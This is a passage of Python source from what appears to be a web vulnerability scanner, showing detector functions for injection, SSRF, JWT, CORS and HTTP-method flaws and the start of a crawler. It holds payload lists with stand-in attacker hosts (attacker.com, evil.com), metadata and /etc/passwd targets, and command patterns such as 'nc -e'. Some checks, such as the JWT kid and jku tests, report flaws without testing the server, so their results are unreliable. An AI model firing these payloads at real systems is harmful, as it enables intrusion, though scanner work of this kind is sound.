        baseline_time = getattr(resp_legit, 'elapsed_time', 0) if resp_legit else 0
        
        false_len = len(resp_false.text) if resp_false else 0
        true_len = len(resp_true.text) if resp_true else 0
        
        false_time = getattr(resp_false, 'elapsed_time', 0) if resp_false else 0
        true_time = getattr(resp_true, 'elapsed_time', 0) if resp_true else 0
        
        # Check if false and true responses differ
        if false_len != true_len or resp_false.status_code != resp_true.status_code:
            evidence = f"False len: {false_len}, True len: {true_len}, Baseline: {baseline_len}"
            return {
                "type":"SQLi (Boolean Baseline)",
                "confidence":90,
                "evidence":evidence,
                "baseline_length":baseline_len,
                "false_condition_length":false_len,
                "true_condition_length":true_len
            }
        
        # Check for timing differences
        if abs(false_time - true_time) > 0.5:
            return {
                "type":"SQLi (Time-based Baseline)",
                "confidence":75,
                "evidence":f"False time: {false_time:.2f}s, True time: {true_time:.2f}s"
            }
        
        return None

    @staticmethod
    def nosql_operator_injection(resp_baseline: Optional[Any], resp_gt: Optional[Any], resp_regex: Optional[Any]) -> List[Dict[str, Any]]:
        """
        NoSQL operator injection detection for MongoDB:
        - Replace parameter with {"$gt": ""} to see if it returns all users
        - Replace parameter with {"$regex": ".*"} to see if it returns all users
        - Compare response length to baseline. If > baseline, authentication bypass exists
        """
        baseline_len = len(resp_baseline.text) if resp_baseline else 0
        gt_len = len(resp_gt.text) if resp_gt else 0
        regex_len = len(resp_regex.text) if resp_regex else 0
        
        vulns = []
        
        # Check $gt operator
        if gt_len > baseline_len * 1.1:  # 10% threshold to account for noise
            vulns.append({
                "type":"NoSQL Injection ($gt operator)",
                "confidence":85,
                "evidence":f"Response length increased from {baseline_len} to {gt_len}",
                "baseline_length":baseline_len,
                "injection_length":gt_len
            })
        
        # Check $regex operator
        if regex_len > baseline_len * 1.1:
            vulns.append({
                "type":"NoSQL Injection ($regex operator)",
                "confidence":85,
                "evidence":f"Response length increased from {baseline_len} to {regex_len}",
                "baseline_length":baseline_len,
                "injection_length":regex_len
            })
        
        # Check for status code differences
        if resp_gt and resp_gt.status_code != (resp_baseline.status_code if resp_baseline else 200):
            vulns.append({
                "type":"NoSQL Injection ($gt status)",
                "confidence":75,
                "evidence":f"Status code changed from {resp_baseline.status_code if resp_baseline else 200} to {resp_gt.status_code}"
            })
        
        if resp_regex and resp_regex.status_code != (resp_baseline.status_code if resp_baseline else 200):
            vulns.append({
                "type":"NoSQL Injection ($regex status)",
                "confidence":75,
                "evidence":f"Status code changed from {resp_baseline.status_code if resp_baseline else 200} to {resp_regex.status_code}"
            })
        
        return vulns if vulns else None

    @staticmethod
    def small_difference_detection(html1: str, html2: str, context: str = "") -> List[str]:
        """
        Small difference detection (DETERMINISTIC MODE using structural diff):
        - Only flag CRITICAL security-relevant differences
        - Look for differences in JSON keys like "isAdmin": false vs "isAdmin": true
        - Look for differences in hidden HTML input fields
        - If a minor parameter change flips a boolean flag, escalate it
        - Uses exact key matching (not regex) to avoid false negatives on keys like "admin_timestamp"
        """
        import json
        import re
        
        differences = []
        
        # EXACT keys to IGNORE (non-security-relevant changes) - using exact match, not regex
        IGNORE_KEYS_EXACT = {
            'timestamp', 'created_at', 'updated_at', 'date', 'time',
            'session_id', 'sess_id', 'csrf_token', 'nonce',
            '_token', 'auth_token', 'jwt', 'exp', 'iat',
            'request_id', 'trace_id', 'correlation_id',
            'uuid', 'guid', 'version', 'etag'
        }
        
        def should_ignore_key(key):
            """Check if key should be ignored (non-security-relevant) - EXACT match only"""
            key_lower = key.lower()
            return key_lower in IGNORE_KEYS_EXACT
        
        # Try to parse as JSON
        try:
            json1 = json.loads(html1) if html1 else {}
            json2 = json.loads(html2) if html2 else {}
        except json.JSONDecodeError:
            # If not JSON, fall back to text comparison
            json1 = None
            json2 = None
        
        if json1 is not None and json2 is not None:
            # Compare JSON structures recursively using structural diff
            def compare_json(obj1, obj2, path=""):
                if isinstance(obj1, dict) and isinstance(obj2, dict):
                    all_keys = set(obj1.keys()) | set(obj2.keys())
                    for key in all_keys:
                        # Skip ignored keys (exact match only)
                        if should_ignore_key(key):
                            continue
                            
                        new_path = f"{path}.{key}" if path else key
                        if key not in obj1:
                            differences.append(f"Key added: {new_path} = {obj2[key]}")
                        elif key not in obj2:
                            differences.append(f"Key removed: {new_path}")
                        else:
                            # Check for boolean flips (CRITICAL)
                            if isinstance(obj1[key], bool) and isinstance(obj2[key], bool):
                                if obj1[key] != obj2[key]:
                                    differences.append(f"Boolean flip: {new_path} changed from {obj1[key]} to {obj2[key]}")
                            # Check for numeric changes (only if significant)
                            elif isinstance(obj1[key], (int, float)) and isinstance(obj2[key], (int, float)):
                                if obj1[key] != obj2[key]:
                                    # Only flag if change is > 10% or involves critical fields
                                    if abs(obj2[key] - obj1[key]) / max(abs(obj1[key]), 1) > 0.1:
                                        differences.append(f"Value change: {new_path} changed from {obj1[key]} to {obj2[key]}")
                            else:
                                compare_json(obj1[key], obj2[key], new_path)
                elif isinstance(obj1, list) and isinstance(obj2, list):
                    if len(obj1) != len(obj2):
                        differences.append(f"Array length changed at {path}: {len(obj1)} vs {len(obj2)}")
            
            compare_json(json1, json2)
        else:
            # Not JSON, check HTML for hidden fields
            hidden_pattern = re.compile(r'<input[^>]*type=["\']hidden["\'][^>]*>', re.IGNORECASE)
            hidden1 = hidden_pattern.findall(html1) if html1 else []
            hidden2 = hidden_pattern.findall(html2) if html2 else []
            
            if hidden1 != hidden2:
                differences.append(f"Hidden input fields changed: {len(hidden1)} vs {len(hidden2)}")
                
                # Check for specific value changes in hidden fields
                value_pattern = re.compile(r'value=["\']([^"\']*)["\']', re.IGNORECASE)
                for h1, h2 in zip(hidden1, hidden2):
                    vals1 = value_pattern.findall(h1)
                    vals2 = value_pattern.findall(h2)
                    if vals1 != vals2:
                        differences.append(f"Hidden field value changed: {vals1} -> {vals2}")
        
        # Check for specific boolean flag patterns in text
        bool_patterns = [
            r'isAdmin["\s]*[:=]["\s]*(true|false)',
            r'authenticated["\s]*[:=]["\s]*(true|false)',
            r'authorized["\s]*[:=]["\s]*(true|false)',
            r'admin["\s]*[:=]["\s]*(true|false)',
            r'role["\s]*[:=]["\s]*["\']?admin["\']?',
        ]
        
        for pattern in bool_patterns:
            matches1 = re.findall(pattern, html1, re.IGNORECASE) if html1 else []
            matches2 = re.findall(pattern, html2, re.IGNORECASE) if html2 else []
            if matches1 != matches2:
                differences.append(f"Boolean flag pattern changed: {pattern} - {matches1} -> {matches2}")
        
        if differences:
            return {
                "type":"Small Difference Detected",
                "confidence":70,
                "evidence":f"Found {len(differences)} differences: {'; '.join(differences[:3])}",
                "differences":differences,
                "context":context
            }
        
        return None

    @staticmethod
    def path_traversal(html: str, baseline_html: Optional[str]) -> Optional[Dict[str, Any]]:
        if PASSWD_PATTERN.search(html):
            if baseline_html and PASSWD_PATTERN.search(baseline_html): return None
            return {"type":"PathTraversal","confidence":92,"evidence":Detector._extract(html,PASSWD_PATTERN)}
        return None

    @staticmethod
    def command_injection(html, baseline_html):
        if COMMAND_PATTERN.search(html):
            if baseline_html and COMMAND_PATTERN.search(baseline_html): return None
            return {"type":"CommandInjection","confidence":88,"evidence":Detector._extract(html,COMMAND_PATTERN)}
        return None

    @staticmethod
    def open_redirect(resp, baseline_resp):
        loc = resp.headers.get("Location")
        if loc and "evil.com" in loc:
            if baseline_resp and baseline_resp.headers.get("Location")==loc: return None
            return {"type":"OpenRedirect","confidence":95,"evidence":f"Location: {loc}"}
        if '<meta http-equiv="refresh"' in resp.text.lower() and "evil.com" in resp.text:
            if baseline_resp and "evil.com" in baseline_resp.text: return None
            return {"type":"OpenRedirect","confidence":80,"evidence":"Meta refresh"}
        return None

    @staticmethod
    def ssti(html: str, payload: str, baseline_html: Optional[str]) -> Optional[Dict[str, Any]]:
        if "49" in html and "7*7" in payload:
            if baseline_html and "49" in baseline_html: return None
            return {"type":"SSTI","confidence":90,"evidence":"49 (7*7)"}
        return None

    @staticmethod
    def xxe(html, baseline_html):
        if PASSWD_PATTERN.search(html):
            if baseline_html and PASSWD_PATTERN.search(baseline_html): return None
            return {"type":"XXE","confidence":90,"evidence":Detector._extract(html,PASSWD_PATTERN)}
        return None

    @staticmethod
    def crlf(resp: Any, baseline_resp: Optional[Any]) -> Optional[Dict[str, Any]]:
        if 'X-Custom' in resp.headers or 'crlf' in resp.text.lower():
            if baseline_resp and ('X-Custom' in baseline_resp.headers or 'crlf' in baseline_resp.text.lower()): return None
            return {"type":"CRLF","confidence":70,"evidence":"Header injection"}
        return None

    @staticmethod
    def ssrf(html: str, baseline_html: Optional[str], payload: str, oob_results: List[Dict[str, Any]], sent_marker: str) -> Optional[Dict[str, Any]]:
        if AWS_META_PATTERN.search(html):
            if baseline_html and AWS_META_PATTERN.search(baseline_html): return None
            return {"type":"SSRF (AWS)","confidence":90,"evidence":Detector._extract(html,AWS_META_PATTERN)}
        if "root:x:0:0" in html and "file://" in payload:
            if baseline_html and "root:x:0:0" in baseline_html: return None
            return {"type":"SSRF (File)","confidence":85,"evidence":Detector._extract(html,"root:x:0:0")}
        with oob_results_lock:
            for res in oob_results:
                if sent_marker in res['path']:
                    return {"type":"Blind SSRF","confidence":95,"evidence":f"OOB callback: {res['path']}"}
        return None

    @staticmethod
    def nosqli(html, baseline_html, payload):
        if "true" in html.lower() and "return true" in payload.lower():
            if baseline_html and "true" in baseline_html.lower(): return None
            return {"type":"NoSQLi","confidence":70,"evidence":"Boolean true"}
        return None

    @staticmethod
    def ldapi(html: str, baseline_html: Optional[str], payload: str) -> Optional[Dict[str, Any]]:
        if "uid=" in html.lower() and "*" in payload:
            if baseline_html and "uid=" in baseline_html.lower(): return None
            return {"type":"LDAPi","confidence":70,"evidence":"Filter bypass"}
        return None

    @staticmethod
    def deserialization(html, baseline_html, payload):
        if "rO0" in payload and ("java.io" in html or "Reflection" in html):
            if baseline_html and ("java.io" in baseline_html or "Reflection" in baseline_html): return None
            return {"type":"InsecureDeserialization (Java)","confidence":50,"evidence":"Java error"}
        if payload.startswith("O:") and ("unserialize" in html.lower() or "PHP" in html):
            if baseline_html and ("unserialize" in baseline_html.lower() or "PHP" in baseline_html): return None
            return {"type":"InsecureDeserialization (PHP)","confidence":50,"evidence":"PHP error"}
        return None

    @staticmethod
    def cors_misconfig(url: str, session: Any, selenium_available: bool = False) -> Optional[Dict[str, Any]]:
        test_origin = "https://evil.com"
        headers = {"Origin": test_origin}
        try:
            resp = session.options(url, headers=headers, timeout=5)
            acao = resp.headers.get("Access-Control-Allow-Origin","")
            if acao == '*' or acao == test_origin:
                return {"type":"CORS Misconfiguration","url":url,"evidence":f"ACAO: {acao}","severity":"Medium","confidence":80}
            
            # Test for credentialed CORS with manual headers (fallback when Selenium unavailable)
            if not selenium_available:
                cred_headers = {
                    "Origin": test_origin,
                    "Access-Control-Request-Method": "GET",
                    "Access-Control-Request-Headers": "Authorization, Content-Type"
                }
                try:
                    cred_resp = session.options(url, headers=cred_headers, timeout=5)
                    acao_cred = cred_resp.headers.get("Access-Control-Allow-Origin","")
                    acac = cred_resp.headers.get("Access-Control-Allow-Credentials","")
                    
                    if acao_cred == test_origin and acac == "true":
                        return {"type":"CORS Credentialed Misconfiguration","url":url,"evidence":f"ACAO: {acao_cred}, ACAC: {acac}","severity":"High","confidence":85}
                except Exception as e:
                    logging.warning(f"CORS credentialed test error: {e}")
        except Exception as e:
            logging.warning(f"CORS check error: {e}")
        return None

    @staticmethod
    def jwt_test(token: str, public_key: Optional[str] = None) -> List[Dict[str, Any]]:
        vulns = []
        try:
            decoded = pyjwt.decode(token, options={"verify_signature": False})
            if decoded:
                header = pyjwt.get_unverified_header(token)
                if header.get('alg') != 'none':
                    try:
                        pyjwt.encode(decoded, key='', algorithm='none')
                        vulns.append({"type":"JWT None Algorithm","confidence":95,"evidence":"Token accepted with alg=none"})
                    except Exception as e:
                        logging.debug(f"JWT none algorithm test failed: {e}")
                
                # Test for kid injection path traversal
                if 'kid' in header:
                    kid_payloads = [
                        "../../../../dev/null",
                        "http://attacker.com/key.pem",
                        "../../../../etc/passwd",
                        "..\\..\\..\\..\\windows\\win.ini",
                        "http://evil.com/key.pem",
                        "file:///etc/passwd",
                        "path/to/key",
                        "null",
                        ""
                    ]
                    for kid_payload in kid_payloads:
                        try:
                            test_header = header.copy()
                            test_header['kid'] = kid_payload
                            test_token = pyjwt.encode(decoded, key='', algorithm='HS256', headers=test_header)
                            # If we can create a token with malicious kid, it's vulnerable
                            vulns.append({"type":"JWT kid Injection","confidence":85,"evidence":f"kid accepts path traversal: {kid_payload}"})
                            break
                        except Exception as e:
                            logging.debug(f"JWT kid injection test failed: {e}")
                
                # Test for jku (JWK Set URL) injection
                jku_payloads = [
                    "http://localhost:8080/.well-known/jwks.json",
                    "http://127.0.0.1:8080/jwks.json",
                    "http://169.254.169.254/jwks.json",
                    "http://attacker.com/jwks.json",
                    "http://evil.com/malicious_jwks.json",
                    "file:///etc/passwd",
                    "https://internal.company.local/jwks.json",
                    "http://metadata.google.internal/jwks.json",
                ]
                for jku_payload in jku_payloads:
                    try:
                        test_header = header.copy()
                        test_header['jku'] = jku_payload
                        test_token = pyjwt.encode(decoded, key='', algorithm='HS256', headers=test_header)
                        # If we can create a token with malicious jku, it's vulnerable
                        vulns.append({"type":"JWT jku Injection","confidence":85,"evidence":f"jku accepts arbitrary URL: {jku_payload}"})
                        break
                    except Exception as e:
                        logging.debug(f"JWT jku injection test failed: {e}")
        except Exception as e:
            logging.warning(f"JWT decode error: {e}")
        weak_secrets = ['secret','key','password','123456']
        for sec in weak_secrets:
            try:
                pyjwt.decode(token, sec, algorithms=['HS256'])
                vulns.append({"type":"JWT Weak Secret","confidence":90,"evidence":f"HMAC secret: {sec}"})
                break
            except Exception as e:
                logging.debug(f"JWT weak secret test failed for {sec}: {e}")
        if public_key:
            try:
                payload = pyjwt.decode(token, public_key, algorithms=['RS256'])
                forged = pyjwt.encode(payload, public_key, algorithm='HS256')
                if forged != token:
                    vulns.append({"type":"JWT Algorithm Confusion","confidence":90,"evidence":"RS256 to HS256 possible"})
            except Exception as e:
                logging.debug(f"JWT algorithm confusion test failed: {e}")
        return vulns

    @staticmethod
    def log4j(html, payload, oob_results, marker):
        with oob_results_lock:
            for res in oob_results:
                if marker in res['path']:
                    return {"type":"Log4j (JNDI)","confidence":95,"evidence":f"OOB callback: {res['path']}"}
        return None

    @staticmethod
    def log_injection(html: str, baseline_html: Optional[str], payload: str) -> Optional[Dict[str, Any]]:
        if "INJECTED" in html and "%0d%0a" in payload:
            if baseline_html and "INJECTED" in baseline_html: return None
            return {"type":"LogInjection","confidence":80,"evidence":"Log entry reflected"}
        return None

    # ---------------------------------------------------------------------
    # HTTP METHOD VULNERABILITY DETECTION
    # ---------------------------------------------------------------------
    
    @staticmethod
    def put_file_upload(resp, baseline_resp, url, payload):
        """Detect PUT method file upload vulnerabilities"""
        if resp.status == 201 or resp.status == 200:
            # Check if file was uploaded successfully
            if 'created' in resp.text.lower() or 'uploaded' in resp.text.lower() or 'success' in resp.text.lower():
                # Check for webshell upload indicators
                if any(ext in payload.lower() for ext in ['.php', '.jsp', '.asp', '.jspx', '.php5', '.phtml']):
                    return {"type":"PUT Webshell Upload","confidence":90,"evidence":"Executable file upload accepted","severity":"Critical"}
                # Check for sensitive file upload
                if any(pattern in payload.lower() for pattern in ['config', '.env', '.ini', '.conf', 'password', 'key']):
                    return {"type":"PUT Sensitive File Upload","confidence":85,"evidence":"Sensitive configuration file upload accepted","severity":"High"}
                return {"type":"PUT File Upload","confidence":75,"evidence":"File upload accepted without validation","severity":"Medium"}
        # Check for PUT to sensitive paths
        sensitive_paths = ['/admin', '/config', '/api', '/users', '/auth', '/upload']
        if any(path in url.lower() for path in sensitive_paths):
            if resp.status not in [401, 403, 405]:
                return {"type":"PUT to Sensitive Endpoint","confidence":80,"evidence":f"PUT allowed on {url} without auth","severity":"High"}
        return None

    @staticmethod
    def put_resource_overwrite(resp: Any, baseline_resp: Optional[Any], url: str) -> Optional[Dict[str, Any]]:
        """Detect PUT method resource overwrite vulnerabilities"""
        if resp.status == 200 or resp.status == 204:
            # Check if resource was overwritten without proper authorization
            if baseline_resp and baseline_resp.status != resp.status:
                return {"type":"PUT Resource Overwrite","confidence":85,"evidence":"Resource overwritten without authorization","severity":"High"}
        return None

    @staticmethod
    def patch_mass_assignment(resp, baseline_resp, payload):
        """Detect PATCH method mass assignment vulnerabilities"""
        # Handle both sync (requests) and async (aiohttp) responses
        resp_text = resp._body if hasattr(resp, '_body') else (resp.text if isinstance(resp.text, str) else resp.text())
        baseline_text = baseline_resp._body if baseline_resp and hasattr(baseline_resp, '_body') else (baseline_resp.text if baseline_resp and isinstance(baseline_resp.text, str) else (baseline_resp.text() if baseline_resp else ''))
        
        if resp.status == 200:
            # Check for privilege escalation indicators
            escalation_keywords = ['admin', 'role', 'permission', 'access', 'privilege', 'is_admin', 'is_superuser']
            if any(keyword in payload.lower() for keyword in escalation_keywords):
                if any(keyword in resp_text.lower() for keyword in ['success', 'updated', 'granted', 'admin']):
                    return {"type":"PATCH Privilege Escalation","confidence":90,"evidence":"Mass assignment via PATCH allowed","severity":"Critical"}
            # Check for unexpected field updates
            if baseline_resp:
                resp_diff = len(resp_text) - len(baseline_text)
                if abs(resp_diff) > 100:  # Significant response difference
                    return {"type":"PATCH Mass Assignment","confidence":75,"evidence":"Unexpected field update accepted","severity":"Medium"}
        return None

    @staticmethod
    def patch_validation_bypass(resp: Any, baseline_resp: Optional[Any], payload: str) -> Optional[Dict[str, Any]]:
        """Detect PATCH method validation bypass"""
        # Handle both sync (requests) and async (aiohttp) responses
        resp_text = resp._body if hasattr(resp, '_body') else (resp.text if isinstance(resp.text, str) else resp.text())
        
        if resp.status == 200:
            # Check for partial update bypassing validation
            if 'email' in payload.lower() and '@' not in payload:
                if 'updated' in resp_text.lower() or 'success' in resp_text.lower():
                    return {"type":"PATCH Validation Bypass","confidence":85,"evidence":"Invalid email accepted via PATCH","severity":"High"}
            # Check for SQL injection in PATCH
            if "'" in payload and ('error' in resp_text.lower() or 'sql' in resp_text.lower()):
                return {"type":"PATCH SQLi","confidence":80,"evidence":"SQL error in PATCH response","severity":"High"}
        return None

    @staticmethod
    def post_stored_xss(resp: Any, baseline_resp: Optional[Any], payload: str, oob_results: List[Dict[str, Any]], marker: str) -> Optional[Dict[str, Any]]:
        """Detect POST method stored XSS vulnerabilities"""
        # Handle both sync (requests) and async (aiohttp) responses
        resp_text = resp._body if hasattr(resp, '_body') else (resp.text if isinstance(resp.text, str) else resp.text())
        
        xss_patterns = ['<script', 'javascript:', 'onerror=', 'onload=', 'onmouseover=']
        if any(pattern in payload.lower() for pattern in xss_patterns):
            if resp.status == 200 or resp.status == 201:
                # Check OOB callbacks for stored XSS
                with oob_results_lock:
                    for res in oob_results:
                        if marker in res['path']:
                            return {"type":"POST Stored XSS (OOB)","confidence":95,"evidence":f"OOB callback: {res['path']}","severity":"High"}
                # Check for immediate reflection
                if payload in resp_text:
                    return {"type":"POST Reflected XSS","confidence":85,"evidence":"XSS payload reflected in response","severity":"High"}
        return None

    @staticmethod
    def post_auth_bypass(resp: Any, baseline_resp: Optional[Any], url: str) -> Optional[Dict[str, Any]]:
        """Detect POST method authentication bypass"""
        # Handle both sync (requests) and async (aiohttp) responses
        resp_text = resp._body if hasattr(resp, '_body') else (resp.text if isinstance(resp.text, str) else resp.text())
        
        auth_endpoints = ['/login', '/auth', '/signin', '/authenticate', '/api/login']
        if any(endpoint in url.lower() for endpoint in auth_endpoints):
            if resp.status == 200 or resp.status == 302:
                # Check for successful login without credentials
                if isinstance(resp_text, str):
                    if 'token' in resp_text.lower() or 'session' in resp_text.lower() or 'welcome' in resp_text.lower():
                        return {"type":"POST Auth Bypass","confidence":90,"evidence":"Authentication bypass via POST","severity":"Critical"}
        return None

    @staticmethod
    def post_command_injection(resp: Any, baseline_resp: Optional[Any], payload: str) -> Optional[Dict[str, Any]]:
        """Detect POST method command injection"""
        # Handle both sync (requests) and async (aiohttp) responses
        resp_text = resp._body if hasattr(resp, '_body') else (resp.text if isinstance(resp.text, str) else resp.text())
        baseline_text = baseline_resp._body if baseline_resp and hasattr(baseline_resp, '_body') else (baseline_resp.text if baseline_resp and isinstance(baseline_resp.text, str) else (baseline_resp.text() if baseline_resp else ''))
        
        command_patterns = [';id', '|whoami', '&&dir', '||ping', '`id`', '$(', 'nc -e']
        if any(pattern in payload for pattern in command_patterns):
            if isinstance(resp_text, str) and COMMAND_PATTERN.search(resp_text):
                if baseline_resp and isinstance(baseline_text, str) and not COMMAND_PATTERN.search(baseline_text):
                    return {"type":"POST Command Injection","confidence":92,"evidence":"Command execution detected","severity":"Critical"}
        return None

    @staticmethod
    def get_idor(resp, baseline_resp, url, test_id):
        """Detect GET method IDOR vulnerabilities"""
        # Handle both sync (requests) and async (aiohttp) responses
        resp_text = resp._body if hasattr(resp, '_body') else (resp.text if isinstance(resp.text, str) else resp.text())
        baseline_text = baseline_resp._body if baseline_resp and hasattr(baseline_resp, '_body') else (baseline_resp.text if baseline_resp and isinstance(baseline_resp.text, str) else (baseline_resp.text() if baseline_resp else ''))
        
        if resp.status == 200:
            # Check for access to different user's data
            if baseline_resp:
                # Compare response content
                if resp_text != baseline_text and len(resp_text) > 100:
                    # Check for user-specific data patterns
                    user_patterns = ['user', 'profile', 'account', 'email', 'name', 'id']
                    if any(pattern in resp_text.lower() for pattern in user_patterns):
                        return {"type":"GET IDOR","confidence":85,"evidence":f"Access to ID {test_id} returned different data","severity":"High"}
        return None

    @staticmethod
    def get_parameter_pollution(resp: Any, baseline_resp: Optional[Any], url: str) -> Optional[Dict[str, Any]]:
        """Detect GET method parameter pollution"""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        # Check for duplicate parameters
        for param_name, values in params.items():
            if len(values) > 1:
                if resp.status == 200:
                    return {"type":"GET Parameter Pollution","confidence":75,"evidence":f"Duplicate parameter: {param_name}","severity":"Medium"}
        return None

    @staticmethod
    def get_cache_poisoning(resp: Any, baseline_resp: Optional[Any], url: str) -> Optional[Dict[str, Any]]:
        """Detect GET method cache poisoning"""
        cache_headers = ['X-Cache', 'X-Cache-Hit', 'X-Cache-Lookup', 'Age', 'CF-Cache-Status']
        if any(header in resp.headers for header in cache_headers):
            # Check for cache manipulation
            if 'X-Cache: HIT' in resp.headers.get('X-Cache', ''):
                return {"type":"GET Cache Poisoning Potential","confidence":70,"evidence":"Cacheable endpoint detected","severity":"Low"}
        return None

    @staticmethod
    def delete_unauthorized(resp: Any, baseline_resp: Optional[Any], url: str) -> Optional[Dict[str, Any]]:
        """Detect DELETE method unauthorized deletion"""
        if resp.status == 200 or resp.status == 204:
            # Check for successful deletion without proper authorization
            if 'deleted' in resp.text.lower() or 'removed' in resp.text.lower() or 'success' in resp.text.lower():
                return {"type":"DELETE Unauthorized","confidence":90,"evidence":"Deletion succeeded without authorization","severity":"Critical"}
            # Check for deletion on sensitive endpoints
            if any(path in url.lower() for path in ['/admin', '/user', '/account', '/data']):
                if resp.status not in [401, 403, 405]:
                    return {"type":"DELETE on Sensitive Endpoint","confidence":85,"evidence":"DELETE allowed on sensitive path","severity":"High"}
        return None

    @staticmethod
    def delete_idor(resp, baseline_resp, url, test_id):
        """Detect DELETE method IDOR vulnerabilities"""
        if resp.status == 200 or resp.status == 204:
            # Check if deletion of different resource succeeded
            if baseline_resp and baseline_resp.status != resp.status:
                return {"type":"DELETE IDOR","confidence":88,"evidence":f"Deletion of ID {test_id} succeeded","severity":"Critical"}
        return None

    @staticmethod
    def delete_cascading(resp: Any, baseline_resp: Optional[Any], url: str) -> Optional[Dict[str, Any]]:
        """Detect DELETE method cascading deletion"""
        if resp.status == 200:
            # Check for cascading deletion indicators
            cascade_keywords = ['cascade', 'related', 'dependent', 'children', 'foreign']
            if any(keyword in resp.text.lower() for keyword in cascade_keywords):
                return {"type":"DELETE Cascading","confidence":80,"evidence":"Cascading deletion possible","severity":"High"}
        return None

    @staticmethod
    def options_info_disclosure(resp: Any, baseline_resp: Optional[Any], url: str) -> Optional[Dict[str, Any]]:
        """Detect OPTIONS method information disclosure"""
        allow_header = resp.headers.get('Allow', '')
        if allow_header:
            # Check for dangerous methods exposed
            dangerous_methods = ['PUT', 'DELETE', 'PATCH', 'TRACE', 'CONNECT']
            exposed_dangerous = [method for method in dangerous_methods if method in allow_header]
            if exposed_dangerous:
                return {"type":"OPTIONS Info Disclosure","confidence":85,"evidence":f"Exposed methods: {', '.join(exposed_dangerous)}","severity":"Medium"}
        # Check for CORS misconfiguration
        acao = resp.headers.get('Access-Control-Allow-Origin', '')
        if acao == '*' or acao == 'null':
            return {"type":"OPTIONS CORS Misconfig","confidence":80,"evidence":f"ACAO: {acao}","severity":"Medium"}
        return None

    @staticmethod
    def options_method_tampering(resp, baseline_resp, url):
        """Detect OPTIONS method tampering vulnerabilities"""
        # Check for TRACE method (XST vulnerability)
        allow_header = resp.headers.get('Allow', '')
        if 'TRACE' in allow_header:
            return {"type":"OPTIONS TRACE Enabled","confidence":75,"evidence":"TRACE method allowed (XST vulnerability)","severity":"Medium"}
        # Check for missing method restrictions
        if allow_header and len(allow_header.split(',')) > 6:
            return {"type":"OPTIONS Overly Permissive","confidence":70,"evidence":f"Too many methods allowed: {allow_header}","severity":"Low"}
        return None

    @staticmethod
    def _extract(text: str, pattern: Union[str, Pattern], window: int = 120) -> str:
        if isinstance(pattern, str):
            idx = text.find(pattern)
        else:
            m = re.search(pattern, text, re.I)
            idx = m.start() if m else -1
        if idx==-1: return ""
        start = max(0, idx-window)
        end = min(len(text), idx+len(pattern)+window)
        return text[start:end].strip()

# ---------------------------------------------------------------------
# CIRCUIT BREAKER FOR HTTP REQUESTS
# ---------------------------------------------------------------------
class CircuitBreaker:
    """Circuit breaker with failure threshold and exponential backoff"""

    def __init__(self, failure_threshold: int = 5, cooldown: int = 60, max_retries: int = 3) -> None:
        self.failure_threshold = failure_threshold
        self.cooldown = cooldown  # seconds
        self.max_retries = max_retries
        self.failure_count = 0
        self.last_failure_time: Optional[float] = None
        self.state = 'closed'  # closed, open, half-open
        self.lock = threading.Lock()

    def record_failure(self) -> None:
        """Record a failure and potentially open the circuit"""
        with self.lock:
            self.failure_count += 1
            self.last_failure_time = time.time()
            if self.failure_count >= self.failure_threshold:
                self.state = 'open'
                logging.warning(f"Circuit breaker opened after {self.failure_count} failures")
    
    def record_success(self) -> None:
        """Record a success and potentially close the circuit"""
        with self.lock:
            self.failure_count = max(0, self.failure_count - 1)
            if self.state == 'half-open':
                self.state = 'closed'
                logging.info("Circuit breaker closed after successful request")
            elif self.failure_count == 0:
                self.state = 'closed'

    def allow_request(self) -> bool:
        """Check if request is allowed based on circuit state"""
        with self.lock:
            if self.state == 'closed':
                return True
            elif self.state == 'open':
                # Check if cooldown period has passed
                if self.last_failure_time and time.time() - self.last_failure_time >= self.cooldown:
                    self.state = 'half-open'
                    logging.info("Circuit breaker transitioning to half-open")
                    return True
                return False
            elif self.state == 'half-open':
                return True
        return False
    
    def get_backoff_delay(self, attempt: int) -> int:
        """Calculate exponential backoff delay for retry attempt"""
        return min(2 ** attempt, 30)  # Cap at 30 seconds

# ---------------------------------------------------------------------
# CRAWLER ENGINE
# ---------------------------------------------------------------------
class CrawlerEngine:
    """Handles web crawling, link extraction, and parameter discovery"""

    def __init__(self, target: str, config: Dict[str, Any], base_domain: str, exclusion_patterns: List[str], circuit_breaker: CircuitBreaker) -> None:
        self.target = target
        self.config = config
        self.base_domain = base_domain
        self.exclusion_patterns = exclusion_patterns
        self.circuit_breaker = circuit_breaker
        self.visited_urls: Set[str] = set()
        self.crawled_pages: List[Dict[str, Any]] = []
        self.parameters: List[Dict[str, Any]] = []
        self.stop_event = asyncio.Event()

    def _is_valid_url(self, url: str) -> bool:
        """Validate URL has proper structure and resolvable hostname format"""
        try:
            p = urlparse(url)
            if not p.scheme or not p.netloc:
                return False
            if p.scheme not in ('http', 'https'):
                return False
            if OOB_MARKER in url or OOB_DNS in url or 'evil.com' in url:
                return False
            if p.netloc in ('localhost', '127.0.0.1', '::1') or p.netloc.startswith('127.'):
                return False
            if re.search(r'[^a-zA-Z0-9.\-:_]', p.netloc):
                return False
            return True
        except Exception:
            return False
    
    def _is_in_scope(self, url: str) -> bool:
        if not self._is_valid_url(url):
            return False
        p = urlparse(url)
        return p.netloc == self.base_domain and p.scheme in ('http', 'https')
    
    def _extract_links(self, soup: Any, base_url: str, html: str) -> List[str]:
        links = set()
        for a in soup.find_all('a', href=True):
            abs_url = urljoin(base_url, a['href'])
            if self._is_in_scope(abs_url): links.add(abs_url)
        for form in soup.find_all('form'):
            action = form.get('action', '')
            if action:
                abs_url = urljoin(base_url, action)
                if self._is_in_scope(abs_url): links.add(abs_url)
        for link in soup.find_all('link', href=True):
            abs_url = urljoin(base_url, link['href'])
            if self._is_in_scope(abs_url): links.add(abs_url)
        for script in soup.find_all('script', src=True):
            abs_url = urljoin(base_url, script['src'])
            if self._is_in_scope(abs_url): links.add(abs_url)
        for img in soup.find_all('img', src=True):
            abs_url = urljoin(base_url, img['src'])
            if self._is_in_scope(abs_url): links.add(abs_url)
        for tag in soup.find_all(attrs={"srcset": True}):
            for part in tag['srcset'].split(','):
                candidate = part.strip().split(' ')[0]
                abs_url = urljoin(base_url, candidate)
                if self._is_in_scope(abs_url): links.add(abs_url)
        for tag in soup.find_all(attrs={"data-url": True}):
            abs_url = urljoin(base_url, tag['data-url'])
            if self._is_in_scope(abs_url): links.add(abs_url)
        for meta in soup.find_all('meta', attrs={"http-equiv": "refresh", "content": True}):
            match = re.search(r'url=([^;]+)', meta['content'], re.I)
            if match:
                abs_url = urljoin(base_url, match.group(1))
